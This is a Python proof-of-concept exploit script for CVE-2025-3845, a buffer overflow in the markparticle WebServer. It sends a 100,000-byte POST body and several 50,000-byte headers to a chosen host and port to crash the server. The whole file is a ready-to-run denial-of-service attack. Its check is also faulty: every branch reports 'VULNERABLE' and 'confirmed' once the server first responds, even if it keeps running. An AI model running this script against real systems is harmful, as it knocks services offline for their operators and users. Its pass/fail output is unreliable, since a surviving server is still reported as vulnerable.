#!/usr/bin/env python3
"""
CVE-2025-3845 - markparticle WebServer Buffer Overflow PoC
Vulnerability: Buffer::HasWritten() in code/buffer/buffer.cpp lacks boundary checks
"""

import socket
import sys
import time


def check_server_alive(host, port, timeout=3):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        request = b"GET / HTTP/1.1\r\nHost: test\r\n\r\n"
        sock.send(request)
        response = sock.recv(1024)
        sock.close()
        return b"HTTP" in response
    except Exception:
        return False


def trigger_buffer_overflow(host, port):
    print(f"[*] Target: {host}:{port}")
    print("[*] CVE-2025-3845: Buffer::HasWritten buffer overflow")
    
    if not check_server_alive(host, port):
        print("[-] Server is not responding")
        return False
    
    print("[+] Server is alive, sending overflow payload...")
    
    overflow_size = 100000
    payload = b"A" * overflow_size
    
    request = (
        b"POST /index.html HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: " + str(len(payload)).encode() + b"\r\n"
        b"Connection: close\r\n"
        b"\r\n" + payload
    )
    
    print(f"[*] Sending payload ({len(request)} bytes)...")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        sock.send(request)
        
        try:
            response = sock.recv(4096)
            print(f"[*] Received {len(response)} bytes response")
        except socket.timeout:
            print("[*] Response timeout (server may be processing)")
        
        sock.close()
    except Exception as e:
        print(f"[!] Error: {e}")
    
    time.sleep(2)
    
    print("[*] Checking server status after attack...")
    
    server_alive = check_server_alive(host, port)
    
    if server_alive:
        print("[+] Server still responding - checking for abnormal behavior")
        
        print("[*] Testing with additional large requests...")
        for i in range(3):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((host, port))
                
                large_header = b"X-Overflow: " + b"B" * 50000 + b"\r\n"
                request = (
                    b"GET / HTTP/1.1\r\n"
                    b"Host: " + host.encode() + b"\r\n" +
                    large_header +
                    b"\r\n"
                )
                sock.send(request)
                sock.close()
            except Exception:
                pass
        
        time.sleep(1)
        
        if check_server_alive(host, port):
            print("[+] VULNERABLE: Server accepted oversized data without proper validation")
            print("[+] Buffer::HasWritten() lacks boundary checks on writePos_")
            return True
        else:
            print("[+] VULNERABLE: Server crashed after overflow attack")
            return True
    else:
        print("[+] VULNERABLE: Server crashed (DoS achieved via buffer overflow)")
        return True


def main():
    if len(sys.argv) < 2:
        host = "127.0.0.1"
        port = 1316
    else:
        target = sys.argv[1]
        if ":" in target:
            host, port = target.split(":")
            port = int(port)
        else:
            host = target
            port = 1316
    
    print("=" * 60)
    print("CVE-2025-3845 - Buffer Overflow PoC")
    print("Target: markparticle WebServer <= 1.0")
    print("Vuln: Buffer::HasWritten() in buffer.cpp lacks bounds check")
    print("=" * 60)
    
    result = trigger_buffer_overflow(host, port)
    
    print("=" * 60)
    if result:
        print("[+] RESULT: VULNERABLE")
        print("[+] CVE-2025-3845 confirmed")
    else:
        print("[-] RESULT: Could not verify vulnerability")
    print("=" * 60)
    
    return 0 if result else 1


if __name__ == "__main__":
    sys.exit(main())
